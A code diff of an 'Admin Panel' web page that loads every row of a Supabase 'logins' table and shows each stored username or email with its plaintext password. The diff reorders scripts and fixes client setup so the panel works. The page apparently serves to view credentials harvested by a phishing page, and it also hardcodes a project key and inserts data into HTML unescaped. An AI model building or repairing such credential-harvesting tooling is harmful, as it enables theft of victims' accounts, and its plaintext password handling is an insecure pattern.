@@ -5,9 +5,30 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Admin Panel</title>
   <style>
-    body { font-family: Arial, sans-serif; background:#f2f3f5; padding:20px; }
-    .card { background:white; padding:15px; margin:10px 0; border-radius:8px; box-shadow:0 2px 8px rgba(0,0,0,0.1); }
-    button { padding:12px 24px; background:#0064e0; color:white; border:none; border-radius:8px; cursor:pointer; }
+    body { 
+      font-family: Arial, sans-serif; 
+      background:#f2f3f5; 
+      padding:20px; 
+      margin: 0;
+    }
+    .card { 
+      background:white; 
+      padding:18px; 
+      margin:12px 0; 
+      border-radius:10px; 
+      box-shadow:0 4px 12px rgba(0,0,0,0.1); 
+    }
+    button { 
+      padding:12px 24px; 
+      background:#0064e0; 
+      color:white; 
+      border:none; 
+      border-radius:8px; 
+      cursor:pointer;
+      font-size: 16px;
+    }
+    button:hover { background:#0052b8; }
+    h1 { margin-bottom: 20px; }
   </style>
 </head>
 <body>
@@ -15,18 +36,30 @@
   <button onclick="loadLogins()">🔄 Refresh</button>
   <div id="list"></div>
 
-  <script>
-    const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";
-    const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Full key
+  <!-- Supabase CDN - MUST be before your script -->
+  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
-    let supabase = Supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+  <script>
+    // ================== SUPABASE CONFIG ==================
+    const SUPABASE_URL = "https://kzhodlfnaoxfbmcmffuq.supabase.co";
+    const SUPABASE_ANON_KEY = "sb_publishable_82Z4St3QMsjIewnpr9i50w_Lxq0iTZo"; // ← Use your full key
+
+    let supabaseClient;
+
+    try {
+      const { createClient } = supabase;
+      supabaseClient = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+      console.log("✅ Supabase initialized in admin");
+    } catch (e) {
+      console.error("❌ Supabase init failed", e);
+    }
 
     async function loadLogins() {
       const list = document.getElementById('list');
       list.innerHTML = "<p>Loading data...</p>";
 
       try {
-        const { data, error } = await supabase
+        const { data, error } = await supabaseClient
           .from('logins')
           .select('*')
           .order('timestamp', { ascending: false });
@@ -42,22 +75,21 @@
         data.forEach(item => {
           html += `
             <div class="card">
-              <strong>Username:</strong> ${item.username}<br>
+              <strong>Username / Email:</strong> ${item.username}<br>
               <strong>Password:</strong> ${item.password}<br>
-              <small>${new Date(item.timestamp).toLocaleString()}</small>
+              <small style="color:#666;">${new Date(item.timestamp).toLocaleString()}</small>
             </div>`;
         });
+
         list.innerHTML = html;
       } catch (err) {
-        list.innerHTML = `<p style="color:red">Error: ${err.message}</p>`;
         console.error(err);
+        list.innerHTML = `<p style="color:red">Error loading data: ${err.message}</p>`;
       }
     }
 
-    loadLogins();
+    // Load data when page opens
+    window.onload = loadLogins;
   </script>
-
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  
 </body>
 </html>
